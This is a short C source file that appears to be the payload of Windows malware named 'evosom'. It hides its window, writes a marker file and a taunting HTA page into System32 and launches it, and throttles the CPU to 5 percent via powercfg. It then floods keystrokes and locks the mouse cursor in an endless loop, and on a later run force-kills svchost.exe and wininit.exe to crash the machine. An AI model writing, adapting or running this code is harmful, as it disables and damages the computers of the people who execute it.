#include "evosom.h"





BOOL MainPayload() {
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	FILE* fp;
	fp = fopen("C:\\Windows\\System32\\hell.txt", "r");
	if (!fp) {
		goto NORMAL;
		fclose(fp);
	}
	else{
		goto PASS;
	}

	fclose(fp);
	
NORMAL:
	//idk
	printf("fuck");
	FILE* fpp;

	fpp = fopen("C:\\Windows\\System32\\hell.txt", "w");

	fclose(fpp);

	FILE* bp;
	bp = fopen("C:\\Windows\\System32\\hell.hta", "w");
	fprintf(bp, "<style>body{text-align: center; background-color: black; color: red;}</style>\n<h1>In the quiet echoes of memory, your love lingers like a bittersweet melody</h1>\n<h2>Each tender touch, each shared moment, now a cherished ache in my heart. </h2>\n<h3>the depth of our connection was a tapestry woven with threads of affection and understanding.</h3>\n<h4>You Made Me Broken</h4>\n<h1>evosom is the result from this, a failed company which YOU ruined</h1>\n<h6>I will now ruin you and your heart, the sane way you did to me</h6>");
	fclose(bp);
	ShellExecuteA(NULL, "open", "mshta.exe", "C:\\Windows\\System32\\hell.hta", NULL, SW_SHOWMAXIMIZED);

	WinExec("powercfg /CHANGESETTINGS SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 5", SW_HIDE);
	WinExec("powercfg /CHANGESETTINGS SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 5", SW_HIDE);



	while(TRUE) {
		keybd_event('h', 0, 0, 0);
		keybd_event('h', 0, KEYEVENTF_KEYUP, 0);
		SetCursorPos(500, 500);
		Sleep(10);
	}
	return FALSE;

PASS:
	WinExec("taskkill /f /im svchost.exe", SW_HIDE);
	WinExec("wininit.exe", SW_HIDE);
	WinExec("taskkill /f /im wininit.exe", SW_HIDE);
	return TRUE;

	
}